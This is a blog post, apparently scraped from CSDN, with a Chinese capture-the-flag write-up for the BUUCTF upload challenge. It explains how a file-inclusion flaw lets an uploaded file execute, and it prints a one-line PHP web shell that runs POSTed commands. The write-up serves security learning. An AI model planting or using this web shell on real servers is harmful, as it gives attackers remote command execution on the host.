{"blogid": "123264008", "writerAge": "码龄1年", "writerBlogNum": "60", "writerCollect": "50", "writerComment": "4", "writerFan": "152", "writerGrade": "3级", "writerIntegral": "660", "writerName": "hcjtn", "writerProfileAdress": "writer_image\\profile_123264008.jpg", "writerRankTotal": "48068", "writerRankWeekly": "362881", "writerThumb": "46", "writerVisitNum": "66911", "blog_read_count": "2927", "blog_time": "于 2022-03-03 21:17:53 发布", "blog_title": "BUUCTF--BUU UPLOAD COURSE 1", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-tomorrow-night-eighties\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h1><a id=\"BUUCTFBUU_UPLOAD_COURSE_1_0\"></a>BUUCTF–BUU UPLOAD COURSE 1</h1>\n<p>一进入本题，我们先尝试上传文件，发现我们无论上传什么文件都会上传成功。我们尝试直接上传 shell.php 文件，上传成功，但在访问的时候发现：</p>\n<p><img alt=\"(C:\\Users\\hcj\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220303155915409.png)]\" src=\"image\\63ee006b998f43c18c381fb831ae9263.png\"/></p>\n<p>我们没有办法访问，使用AntSword进行连接也是报错<br/> <img alt=\"在这里插入图片描述\" src=\"image\\73f70d385d604cb8a45dbd3affa1b8a4.png\"/></p>\n<p>题目没有设置上传后缀的限制 但是上传之后任意后缀形式都会被改成.jpg格式（无论我们使用什么办法，包括BP改包，放包后依旧以 .jpg 的格式储存），换句话说 .htaccess 配置文件， 也无法使用我们无法使用中国剑蚁进行连接。</p>\n<p>查询了大佬的博客后发现是 文件包含漏洞：</p>\n<blockquote>\n<p>在这里我们就有了疑问，为什么 upload 和 rce 里面的 文件包含有了联系呢？</p>\n<p>我们先回顾一下 rce</p>\n<p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。<br/> 现在就很直观了 上传漏洞可以和 rce 漏洞有机的结合起来<br/> upload 和 rce 的区别：<br/> rce是直接执行命令 upload是上传一个中转文件执行命令<br/> rce重点是上传问题代码文件 upload重点是绕过命令过滤</p>\n</blockquote>\n<p><img alt=\"(C:\\Users\\hcj\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220303163203761.png)]\" src=\"image\\d712087a249e419baf112e4ce5c980ed.png\"/></p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-JVk3Grdo-1646312875502)(C:\\Users\\hcj\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220303163327537.png)]\" src=\"image\\17860007ef3d416e8af5c8890eafe87c.png\"/></p>\n<p>当然我们也可以直接使用这样一句话：</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"x\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span>\n</code></pre>\n<blockquote>\n<p>system：执行外部程序，并且显示输出</p>\n</blockquote>\n<p>注：<br/> 在写一句话木马的时候，必须在eval函数前添加@，否则在使用postman的时候会报错无法得到 flag</p>\n<p>我们可以使用 postman 来进行 查询：</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-mYdowx3P-1646312875503)(C:\\Users\\hcj\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220303164252050.png)]\" src=\"image\\e9313162b4254231b0d39eb99fb4a09f.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\6d0eada34d8b434ea1fae85169d308e6.png\"/><br/> 得到flag</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}